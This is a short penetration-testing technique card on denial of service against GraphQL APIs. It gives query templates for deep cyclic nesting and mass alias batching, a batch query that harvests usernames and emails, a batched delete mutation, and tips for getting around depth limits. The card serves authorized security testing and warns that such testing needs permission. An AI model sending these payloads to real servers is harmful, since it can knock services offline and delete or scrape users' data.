# GraphQL DoS via Deep Nesting / Batching

## When this applies

- Schema has cycles (User → posts → author → posts → ...).
- Server lacks query depth or query cost limits.
- Engagement covers DoS testing.

## Technique

Submit a query with 50+ levels of nesting OR thousands of aliases. Each level multiplies the resolver work; cycles cause exponential blow-up.

## Steps

### Deep nesting (DoS)

```graphql
query {
  user {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                posts {
                  # ... continue nesting
                }
              }
            }
          }
        }
      }
    }
  }
}
```

### Large alias batch

```graphql
query {
  # 10,000 aliases
  u1: getUser(id: 1) { ... }
  u2: getUser(id: 2) { ... }
  # ...
  u10000: getUser(id: 10000) { ... }
}
```

### Batch query abuse — extract many records

```graphql
query {
  # Extract 100 users at once
  user1: getUser(id: 1) { username email }
  user2: getUser(id: 2) { username email }
  # ... continue to user100
}
```

### Mutation batching

```graphql
mutation {
  action1: deletePost(id: 1) { success }
  action2: deletePost(id: 2) { success }
  action3: deletePost(id: 3) { success }
}
```

## Verifying success

- Server response time grows non-linearly with depth/alias count.
- 502/504 from upstream / 503 from origin under heavy load.
- Memory or CPU spike on the server (visible if you control the test environment).

## Common pitfalls

- Apollo Server with `graphql-depth-limit` rejects deep queries — error `"Query exceeds maximum depth"`.
- Cost-based limits (`graphql-validation-complexity`) may reject the query before execution — switch to alias attacks if depth is limited.
- Be EXTREMELY careful in production — DoS is destructive. Only test with explicit authorization.

## Tools

- Burp Suite Repeater
- Custom Python generators (loop builds nested string)
- graphql-cop `--dos`
